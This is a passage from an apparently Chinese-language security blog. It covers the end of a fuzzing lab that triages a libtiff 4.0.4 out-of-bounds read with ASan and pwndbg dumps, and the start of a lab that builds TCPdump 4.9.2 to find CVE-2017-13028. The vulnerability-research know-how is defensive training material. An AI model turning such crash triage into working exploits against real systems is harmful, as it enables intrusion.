<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./ # 重置以前的计数器</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info # 返回“基线”覆盖率数据文件,其中包含每条检测线的零覆盖率</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/coverage/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/fuzzing_tiff/out/default/crashes/<span class="built_in">test</span> <span class="comment"># 运行您要分析的应用程序,您可以使用不同的输入多次运行它</span></span></span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info # 将当前覆盖状态保存到app2.info文件中</span><br></pre></td></tr></table></figure>
<p>最后，我们必须生成 HTML 输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>
<ul>
<li>如果一切顺利，代码覆盖率报告将在 html-coverage 文件夹中创建，只需打开 <code>./html-coverage/index.html</code> 文件，您应该会看到如下内容：</li>
</ul>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660629761847.png" class width="1660629761847"> 
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><p>先使用没有 ASan 的 <code>tiffinfo</code> 来运行 crash 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./tiffinfo test</span><br><span class="line">TIFFReadDirectoryCheckOrder: Warning, Invalid TIFF directory; tags are <span class="keyword">not</span> sorted in ascending order.</span><br><span class="line">TIFFReadDirectory: Warning, Unknown field with tag <span class="number">7217</span> (<span class="number">0x1c31</span>) encountered.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: <span class="params">(present)</span></span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function">  Tag 7217: GraphicsMagick 1.2 unreleased Q16 http:<span class="comment">//ww��������������������w.#)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现程序的输出异常，我们先利用 ASan 进行调试，ASan 提供的报错信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">==<span class="number">3333</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x6070000000d1</span> at pc <span class="number">0x0000002aadf2</span> bp <span class="number">0x7fffffffda30</span> sp <span class="number">0x7fffffffd1f0</span></span><br><span class="line">READ of size <span class="number">66</span> at <span class="number">0x6070000000d1</span> thread T0</span><br><span class="line">[Attaching after Thread <span class="number">0x7ffff7c01800</span> (LWP <span class="number">3333</span>) fork to child process <span class="number">3337</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">3337</span>)]</span><br><span class="line">[Detaching after fork from parent process <span class="number">3333</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">3333</span>) detached]</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">process <span class="number">3337</span> is executing <span class="keyword">new</span> program: /usr/lib/llvm<span class="number">-11</span>/bin/llvm-symbolizer</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x2aadf1</span> in <span class="built_in">fputs</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x47068f</span> in _TIFFPrintField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">127</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x47068f</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">641</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x7ffff7c28082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>根据 ASan 提供的信息，在 <code>0x2aadf2</code> 打上断点，对比溢出点执行前后 heap 的变化：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">*RBX  <span class="number">0x607000000090</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line">*RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x14</span></span><br><span class="line">*RDI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line">*RSI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line">*RBP  <span class="number">0x7fffffffda30</span> —▸ <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x7fffffffdc90</span> —▸ <span class="number">0x7fffffffdde0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RIP  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x2aadf2</span> &lt;<span class="built_in">fputs</span>+<span class="number">386</span>&gt;    lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">   <span class="number">0x2aadf9</span> &lt;<span class="built_in">fputs</span>+<span class="number">393</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x2aadfc</span> &lt;<span class="built_in">fputs</span>+<span class="number">396</span>&gt;    mov    rsi, r13</span><br><span class="line">   <span class="number">0x2aadff</span> &lt;<span class="built_in">fputs</span>+<span class="number">399</span>&gt;    mov    rcx, r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line"> RBX  <span class="number">0x607000000090</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line"> RSI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffda30</span> —▸ <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x7fffffffdc90</span> —▸ <span class="number">0x7fffffffdde0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RIP  <span class="number">0x2aadf9</span> (<span class="built_in">fputs</span>+<span class="number">393</span>) ◂— mov    rdi, rax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x2aadf2</span> &lt;<span class="built_in">fputs</span>+<span class="number">386</span>&gt;    lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line"> ► <span class="number">0x2aadf9</span> &lt;<span class="built_in">fputs</span>+<span class="number">393</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x2aadfc</span> &lt;<span class="built_in">fputs</span>+<span class="number">396</span>&gt;    mov    rsi, r13</span><br><span class="line">   <span class="number">0x2aadff</span> &lt;<span class="built_in">fputs</span>+<span class="number">399</span>&gt;    mov    rcx, r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffda30</span><span class="number">-0x840</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx rsp <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓            <span class="number">5</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffffffd220</span> ◂— <span class="number">0x1b</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffd228</span> ◂— <span class="number">0x400</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实这里还不容易看出内存泄露</li>
<li>所以我们用 GDB 在没有 ASan 的 <code>tiffinfo-&gt;tif_print.c:127</code> 处打断点，进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x289711</span> &lt;TIFFPrintDirectory+<span class="number">11761</span>&gt;    call   <span class="built_in">fputs</span>@plt                      &lt;<span class="built_in">fputs</span>@plt&gt;</span><br><span class="line">       s: <span class="number">0x49edc0</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line">       stream: <span class="number">0x7ffff7e416a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2a84</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x49edc0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x49edc0</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x49edc8</span> ◂— <span class="number">0x31206b636967614d</span> (<span class="string">&#x27;Magick 1&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x49edd0</span> ◂— <span class="number">0x6c65726e7520322e</span> (<span class="string">&#x27;.2 unrel&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x49edd8</span> ◂— <span class="number">0x3151206465736165</span> (<span class="string">&#x27;eased Q1&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x49ede0</span> ◂— <span class="number">0x2f3a707474682036</span> (<span class="string">&#x27;6 http:/&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x49ede8</span> ◂— <span class="number">0xcccccccccc77772f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x49edf0</span> ◂— <span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x49edf8</span> ◂— <span class="number">0x77cccccccccccccc</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x49ee00</span> —▸ <span class="number">0x29232e</span> (tiffFields+<span class="number">2030</span>) —▸ <span class="number">0x330000</span> (__afl_area_initial+<span class="number">609936</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x49ee08</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x49ee10</span> ◂— <span class="number">0x734d6963</span> <span class="comment">/* &#x27;ciMs&#x27; */</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x/<span class="number">64</span>xb <span class="number">0x49edc0</span></span><br><span class="line"><span class="number">0x49edc0</span>:	<span class="number">0x47</span>	<span class="number">0x72</span>	<span class="number">0x61</span>	<span class="number">0x70</span>	<span class="number">0x68</span>	<span class="number">0x69</span>	<span class="number">0x63</span>	<span class="number">0x73</span></span><br><span class="line"><span class="number">0x49edc8</span>:	<span class="number">0x4d</span>	<span class="number">0x61</span>	<span class="number">0x67</span>	<span class="number">0x69</span>	<span class="number">0x63</span>	<span class="number">0x6b</span>	<span class="number">0x20</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x49edd0</span>:	<span class="number">0x2e</span>	<span class="number">0x32</span>	<span class="number">0x20</span>	<span class="number">0x75</span>	<span class="number">0x6e</span>	<span class="number">0x72</span>	<span class="number">0x65</span>	<span class="number">0x6c</span></span><br><span class="line"><span class="number">0x49edd8</span>:	<span class="number">0x65</span>	<span class="number">0x61</span>	<span class="number">0x73</span>	<span class="number">0x65</span>	<span class="number">0x64</span>	<span class="number">0x20</span>	<span class="number">0x51</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x49ede0</span>:	<span class="number">0x36</span>	<span class="number">0x20</span>	<span class="number">0x68</span>	<span class="number">0x74</span>	<span class="number">0x74</span>	<span class="number">0x70</span>	<span class="number">0x3a</span>	<span class="number">0x2f</span></span><br><span class="line"><span class="number">0x49ede8</span>:	<span class="number">0x2f</span>	<span class="number">0x77</span>	<span class="number">0x77</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span></span><br><span class="line"><span class="number">0x49edf0</span>:	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span></span><br><span class="line"><span class="number">0x49edf8</span>:	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0x77</span></span><br><span class="line"><span class="number">0x49ee00</span>:	[<span class="number">0x2e</span>]	[<span class="number">0x23</span>]	[<span class="number">0x29</span>]	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>目标 <code>fputs</code> 执行结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">  Tag <span class="number">7217</span>: GraphicsMagick <span class="number">1.2</span> unreleased Q16 http:<span class="comment">//ww��������������������w.#)</span></span><br><span class="line">  <span class="number">1</span> Strips:</span><br><span class="line">      <span class="number">0</span>: [       <span class="number">8</span>,     <span class="number">3020</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">4622</span>) exited normally]</span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>0x49ee00</code> 处：<ul>
<li><code>[0x2e]-&gt;[.]</code></li>
<li><code>[0x23]-&gt;[#]</code></li>
<li><code>[0x29]-&gt;[)]</code></li>
</ul>
</li>
<li>这是 <code>0x29232e (tiffFields+2030)</code> 的后3字节，而 <code>fputs</code> 把它打印出来了（内存泄露）</li>
</ul>
<p>因为 <code>fputs</code> 遇到 <code>\x00</code> 才会停止，这就导致了内存泄露</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/16/Fuzz%20Lab3-TCPdump/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/16/Fuzz%20Lab3-TCPdump/" class="post-title-link" itemprop="url">Fuzz Lab3-TCPdump</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-16 22:38:36 / Modified: 22:39:59" itemprop="dateCreated datePublished" datetime="2022-08-16T22:38:36+08:00">2022-08-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab3：TCPdump"><a href="#Fuzz-Lab3：TCPdump" class="headerlink" title="Fuzz-Lab3：TCPdump"></a>Fuzz-Lab3：TCPdump</h2><p>在本练习中，我们将 fuzz <strong>TCPdump</strong> 数据包分析器（截取网络分组，并输出分组内容的工具），目标是在 TCPdump 4.9.2 中找到 [<strong>CVE-2017-13028</strong>] 的 crash/PoC</p>
<ul>
<li><strong>CVE-2017-13028</strong> 是一个越界读取漏洞，可以通过 BOOTP 数据包（引导协议）触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>结果，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
<p>学习的目标：</p>
<ul>
<li>什么是 <strong>ASan (Address Sanitizer)</strong>，一个运行时内存错误检测工具</li>
<li>如何使用 ASAN 对目标进行模糊测试</li>
<li>使用 ASan 对崩溃进行分类有多容易</li>
</ul>
<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
<ul>
<li>找到一种对 TCPdump 进行模糊测试的有效方法</li>
<li>尝试弄清楚如何启用 ASan 进行模糊测试</li>
<li>Fuzz TCPdump，直到你有一些独特的崩溃</li>
<li>对崩溃进行分类以找到漏洞的 PoC</li>
<li>修复问题</li>
</ul>
<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz # 下载tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz # 下载TCPdump需要的跨平台库libpcap</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br><span class="line"></span><br><span class="line">mv libpcap-libpcap-1.8.0/ libpcap-1.8.0 # 将libpcap-libpcap-1.8.0重命名为libpcap-1.8.0(否则tcpdump找不到libpcap.a本地路径)</span><br><span class="line"></span><br><span class="line">cd $HOME/libpcap-1.8.0/ # 构建和安装libpcap</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">cd $HOME/tcpdump-tcpdump-4.9.2/ # 构建和安装tcpdump</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install2/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>要测试一切是否正常，只需键入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install2/sbin/tcpdump -h</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcpdump version <span class="number">4.9</span><span class="number">.2</span></span><br><span class="line">libpcap version <span class="number">1.8</span><span class="number">.0</span></span><br><span class="line">OpenSSL <span class="number">1.1</span><span class="number">.1f</span>  <span class="number">31</span> Mar <span class="number">2020</span></span><br><span class="line">Usage: tcpdump [-aAbdDefhHIJKlLnNOpqStuUvxX#] [ -B size ] [ -c count ]</span><br><span class="line">		[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">		[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">		[ -Q in|out|inout ]</span><br><span class="line">		[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">		[ --immediate-mode ] [ -T type ] [ --version ] [ -V file ]</span><br><span class="line">		[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">		[ -Z user ] [ expression ]</span><br></pre></td></tr></table></figure>
<h2 id="Seed-corpus-creation"><a href="#Seed-corpus-creation" class="headerlink" title="Seed corpus creation"></a>Seed corpus creation</h2><p>您可以在 tests 文件夹中找到很多 .pcap 示例。 您可以使用以下命令行运行这些 .pcap 文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap</span></span><br></pre></td></tr></table></figure>
<ul>
<li>pcap 文件是常用的数据报存储格式（拖入 wireshark 就可以直接查看），可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的</li>
<li>所以我们想要解析里面的数据，也必须按照一定的格式，比如使用 wireshark 或者 tcpdump</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">reading from file ./tests/geneve.pcap, link-<span class="function">type <span class="title">EN10MB</span> <span class="params">(Ethernet)</span></span></span><br><span class="line"><span class="function">06:04:33.817203 00:1b:21:3c:ab:64 &gt; 00:1b:21:3c:ac:30, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 156: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">57261</span>, offset <span class="number">0</span>, flags [DF], proto UDP (<span class="number">17</span>), length <span class="number">142</span>)</span></span></span><br><span class="line"><span class="function">    20.0.0.1.12618 &gt; 20.0.0.2.6081: [no cksum] Geneve, Flags [C], vni 0xa, proto <span class="title">TEB</span> <span class="params">(<span class="number">0x6558</span>)</span>, options [class <span class="title">Standard</span> <span class="params">(<span class="number">0x0</span>)</span> type 0<span class="title">x80</span><span class="params">(C)</span> len 8 data 0000000c]</span></span><br><span class="line"><span class="function">	b6:9e:d2:49:51:48 &gt; fe:71:d8:83:72:4f, ethertype <span class="title">IPv4</span> <span class="params">(<span class="number">0x0800</span>)</span>, length 98: <span class="params">(tos <span class="number">0x0</span>, ttl <span class="number">64</span>, id <span class="number">48546</span>, offset <span class="number">0</span>, flags [DF], proto ICMP (<span class="number">1</span>), length <span class="number">84</span>)</span></span></span><br><span class="line"><span class="function">    30.0.0.1 &gt; 30.0.0.2: ICMP echo request, id 10578, seq 23, length 64</span></span><br><span class="line"><span class="function">	0x0000:  001b 213c ac30 001b 213c ab64 0800 4500  ..!&lt;.0..!&lt;.d..E.</span></span><br><span class="line"><span class="function">	0x0010:  008e dfad 4000 4011 32af 1400 0001 1400  ....@.@.2.......</span></span><br><span class="line"><span class="function">	0x0020:  0002 314a 17c1 007a 0000 0240 6558 0000  ..1J...z...@eX..</span></span><br><span class="line"><span class="function">	0x0030:  0a00 0000 8001 0000 000c fe71 d883 724f  ...........q..rO</span></span><br><span class="line"><span class="function">	0x0040:  b69e d249 5148 0800 4500 0054 bda2 4000  ...IQH..E..T..@.</span></span><br><span class="line"><span class="function">	0x0050:  4001 4104 1e00 0001 1e00 0002 